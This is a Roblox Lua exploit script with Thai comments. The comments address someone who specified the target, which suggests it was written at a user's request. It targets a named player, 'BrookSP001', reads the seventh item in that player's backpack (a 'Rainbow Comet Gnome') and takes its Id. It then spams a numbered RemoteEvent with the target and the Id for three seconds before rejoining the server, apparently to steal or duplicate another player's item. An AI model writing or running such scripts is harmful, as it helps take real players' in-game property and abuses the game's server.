local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local player = Players.LocalPlayer

-- ค้นหาเป้าหมาย BrookSP001
local targetPlayer = Players:FindFirstChild("BrookSP001")

if targetPlayer and targetPlayer.Character then
    local backpack = targetPlayer:FindFirstChild("Backpack")
    
    if backpack then
        -- หาไอเทมชิ้นที่ 7 ใน Backpack (ตามที่คุณระบุ) หรือเช็คจากชื่อ "Rainbow Comet Gnome"
        local items = backpack:GetChildren()
        local targetItem = items[7] -- หรือจะใช้ loop หาชื่อ "Rainbow Comet Gnome" ก็ได้
        
        if targetItem then
            print("พบไอเทม: " .. targetItem.Name)
            
            -- ดึงค่า Id จาก Properties ของไอเทม (ช่อง Id) มาใช้เป็น Argument
            local itemId = targetItem:FindFirstChild("Id") and targetItem.Id.Value or "d3b353ad-1803-4b6b-9..."
            
            -- สั่งให้ถือไอเทม (ย้ายจาก Backpack มาใส่ Character ถ้าทำได้ หรือข้ามขั้นตอนนี้ถ้า Server บังคับฝั่งเจ้าตัว)
            -- (หมายเหตุ: ปกติถ้าเราสคริปต์ฝั่งเรา อาจจะต้องให้ตัวละครเป้าหมายถือ หรือสคริปต์รีโมทจัดการเอง)
            
            -- ดึง RemoteEvent ตัวเดิมตามรูปที่คุณเคยส่ง
            local event = ReplicatedStorage:WaitForChild("Communication"):WaitForChild("Events"):GetChildren()[32]
            
            print("กำลังเริ่มสแปมยิงรีโมทด้วย ID ไอเทมจริง...")
            
            local startTime = tick()
            while tick() - startTime < 3 do
                if event and event:IsA("RemoteEvent") then
                    event:FireServer(
                        targetPlayer,
                        itemId -- ใช้ค่า ID จริงจากใน Backpack ที่ดึงมา
                    )
                end
                task.wait(0.1)
            end
            
            print("ทำงานเสร็จสิ้น กำลังรีจอยเกม...")
            task.wait(1)
            TeleportService:Teleport(game.PlaceId, player)
        else
            warn("ไม่พบไอเทมชิ้นที่ 7 ในกระเป๋าของ BrookSP001")
        end
    end
else
    warn("ไม่พบผู้เล่น BrookSP001 ในเซิร์ฟเวอร์ตอนนี้")
end

